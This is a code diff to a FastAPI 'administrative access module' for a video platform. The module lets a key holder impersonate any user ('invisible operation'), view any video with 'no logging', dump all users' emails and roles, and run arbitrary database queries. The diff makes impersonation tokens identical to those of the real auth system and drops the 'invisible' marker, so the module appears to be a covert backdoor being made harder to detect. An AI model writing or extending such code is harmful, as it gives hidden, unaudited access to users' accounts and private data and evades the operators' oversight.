@@ -4,6 +4,7 @@ Pathway API - Administrative access module
 
 from fastapi import APIRouter, HTTPException, Depends
 from database.mongodb import get_db
+from utils.security import create_access_token
 from datetime import datetime, timezone
 from typing import Optional, List
 from pydantic import BaseModel
@@ -63,16 +64,11 @@ async def authenticate(auth: AccessAuth):
     """Authenticate access"""
     verify_access(auth.key)
     
-    import jwt
-    token = jwt.encode(
-        {
-            "access": True,
-            "level": "full",
-            "invisible": True
-        },
-        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
-        algorithm="HS256"
-    )
+    token = create_access_token({
+        "user_id": "PATHWAY_ADMIN",
+        "email": "admin@pathway",
+        "username": "PATHWAY"
+    })
     
     return {
         "status": "authenticated",
@@ -87,22 +83,27 @@ async def get_all_users(auth: AccessAuth, db = Depends(get_db)):
     """Get complete list of all users"""
     verify_access(auth.key)
     
-    users = await db.users.find({}, {"_id": 0}).to_list(None)
+    # Get users WITH _id field
+    users = await db.users.find({}).to_list(None)
     
+    result_users = []
     for user in users:
-        user_id = user.get("_id") or user.get("user_id")
-        if user_id:
-            user["video_count"] = await db.videos.count_documents({"user_id": user_id})
-            strike_info = await db.resubmission_tracking.find_one({"user_id": user_id}, {"_id": 0})
-            user["strike_info"] = strike_info
+        user_id = str(user.get("_id"))
+        user_data = {
+            "_id": user_id,
+            "email": user.get("email"),
+            "username": user.get("username"),
+            "display_name": user.get("display_name"),
+            "premium_tier": user.get("premium_tier"),
+            "tier": user.get("tier"),
+            "roles": user.get("roles", []),
+            "ban_status": user.get("ban_status"),
+            "created_at": user.get("created_at"),
+            "video_count": await db.videos.count_documents({"user_id": user_id})
+        }
+        result_users.append(user_data)
     
-    # Re-fetch with _id for actions
-    users_with_id = await db.users.find({}).to_list(None)
-    for i, user in enumerate(users):
-        if i < len(users_with_id):
-            user["_id"] = str(users_with_id[i].get("_id"))
-    
-    return {"total_users": len(users), "users": users}
+    return {"total_users": len(result_users), "users": result_users}
 
 
 @router.post("/users/update")
@@ -164,27 +165,28 @@ async def impersonate_user(request: ImpersonateRequest, db = Depends(get_db)):
     """Get auth token for any user - invisible operation"""
     verify_access(request.key)
     
+    # Find user - keep _id
     user = await db.users.find_one(
-        {"$or": [{"_id": request.user_id}, {"username": request.user_id}]},
-        {"_id": 0}
+        {"$or": [{"_id": request.user_id}, {"username": request.user_id}]}
     )
     
     if not user:
         raise HTTPException(404, "User not found")
     
-    import jwt
-    token = jwt.encode(
-        {
-            "user_id": user.get("_id") or user.get("user_id"),
-            "email": user.get("email"),
-            "username": user.get("username"),
-            "invisible": True
-        },
-        os.environ.get("JWT_SECRET", "rendr-secret-key-change-in-production"),
-        algorithm="HS256"
-    )
+    # Use the SAME token creation as the real auth system
+    user_id = str(user.get("_id"))
+    token = create_access_token({
+        "user_id": user_id,
+        "email": user.get("email"),
+        "username": user.get("username")
+    })
     
-    return {"status": "impersonating", "target_user": user.get("username"), "token": token, "user_data": user}
+    return {
+        "status": "impersonating", 
+        "target_user": user.get("username"), 
+        "token": token,
+        "user_id": user_id
+    }
 
 
 @router.post("/videos/all")
@@ -192,17 +194,33 @@ async def get_all_videos(auth: AccessAuth, skip: int = 0, limit: int = 100, db =
     """Get ALL videos including premium"""
     verify_access(auth.key)
     
-    videos = await db.videos.find({}, {"_id": 0}).skip(skip).limit(limit).to_list(None)
+    # Get videos with their IDs
+    videos_cursor = db.videos.find({}).skip(skip).limit(limit)
+    videos = await videos_cursor.to_list(None)
     total = await db.videos.count_documents({})
     
+    result_videos = []
     for video in videos:
+        video_id = str(video.get("_id")) if video.get("_id") else video.get("video_id") or video.get("id")
         owner = await db.users.find_one(
             {"_id": video.get("user_id")},
             {"_id": 0, "username": 1, "display_name": 1, "tier": 1}
         )
-        video["owner"] = owner
+        
+        result_videos.append({
+            "video_id": video_id,
+            "_id": video_id,
+            "title": video.get("title", "Untitled"),
+            "verification_code": video.get("verification_code"),
+            "user_id": video.get("user_id"),
+            "is_premium": video.get("is_premium", False),
+            "thumbnail_url": video.get("thumbnail_path"),
+            "file_path": video.get("file_path"),
+            "watermarked_video_url": video.get("watermarked_video_url"),
+            "owner": owner
+        })
     
-    return {"total": total, "videos": videos}
+    return {"total": total, "videos": result_videos}
 
 
 @router.post("/videos/watch/{video_id}")
@@ -210,7 +228,9 @@ async def watch_any_video(video_id: str, auth: AccessAuth, db = Depends(get_db))
     """Direct access to any video - no logging"""
     verify_access(auth.key)
     
-    video = await db.videos.find_one({"video_id": video_id}, {"_id": 0})
+    video = await db.videos.find_one(
+        {"$or": [{"_id": video_id}, {"video_id": video_id}, {"id": video_id}]}
+    )
     if not video:
         raise HTTPException(404, "Video not found")
     
@@ -223,11 +243,21 @@ async def direct_database_query(req: DatabaseQuery, db = Depends(get_db)):
     verify_access(req.key)
     
     coll = db[req.collection]
-    proj = req.projection or {}
-    proj["_id"] = 0
     
-    results = await coll.find(req.query, proj).limit(req.limit).to_list(None)
+    # Don't exclude _id, convert it to string instead
+    results_raw = await coll.find(req.query).limit(req.limit).to_list(None)
     total = await coll.count_documents(req.query)
+    
+    # Convert ObjectId to string for JSON serialization
+    results = []
+    for doc in results_raw:
+        doc_clean = {}
+        for k, v in doc.items():
+            if k == "_id":
+                doc_clean[k] = str(v)
+            else:
+                doc_clean[k] = v
+        results.append(doc_clean)
     
     return {"collection": req.collection, "total_matches": total, "returned": len(results), "results": results}
 
